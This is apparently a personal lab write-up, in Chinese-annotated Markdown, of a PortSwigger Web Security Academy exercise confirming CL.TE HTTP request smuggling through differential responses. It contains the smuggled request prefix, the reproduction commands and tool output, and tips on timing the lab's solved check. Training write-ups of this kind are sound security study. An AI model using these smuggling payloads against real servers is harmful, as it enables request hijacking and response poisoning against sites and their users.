---
title: "lab-confirming-cl-te-via-differential-responses"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-confirming-cl-te-via-differential-responses

> evidences: [[request-smuggling-family]]

- 题面:confirming a CL.TE vulnerability via differential responses(/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)
- 实例:https://0a3f009904bd6acc81f726480019008a.web-security-academy.net
- 判定目标:走私请求使后续 `GET /` 返 404;状态:**solved**

## 关键步

1. CL.TE 差分帧:`--cl-te 'GET /404 HTTP/1.1\r\nX-Ignore: X'`(无尾 CRLF;CL=35,前缀长 30)。
   后端在 `0\r\n\r\n` 结束首请求,残留 `GET /404 HTTP/1.1\r\nX-Ignore: X`。
2. 其后的 `GET /` 从前端进后端,拼成 `X-Ignore: XGET / HTTP/1.1`(成头部值),走私请求
   `GET /404` 被完整解析 → 后端回 404,前端把它当作后续 `/` 请求的响应。
3. 单发走私帧即可看到差分(`conn_reuse <inst> --cl-te '...'` 直接回 `404 Not Found`)。
4. **收口节奏**:academy 判定比我们的请求慢一拍;首次 `solved_check` 可能自身拿到 404
   (banner 不在),**再跑一次** `solved_check` 即读到 `Congratulations`。

## 证据摘录

```
conn_reuse <inst> --cl-te 'GET /404 HTTP/1.1\r\nX-Ignore: X' --quiet
 -> HTTP/1.1 404 Not Found
solved_check #1 -> {"solved":false,"status":404}
solved_check #2 -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch 15F066DF40DD7D208E9874AF7DBA51AC602D94871F25CCD02692A793EBFFE91F --widget-source /web-security/request-smuggling/finding --jar <jar>
conn_reuse "https://<inst>" --cl-te 'GET /404 HTTP/1.1\r\nX-Ignore: X' --read-ms 2500 --quiet
solved_check "https://<inst>/" --jar <jar>   # 可跑两次
```
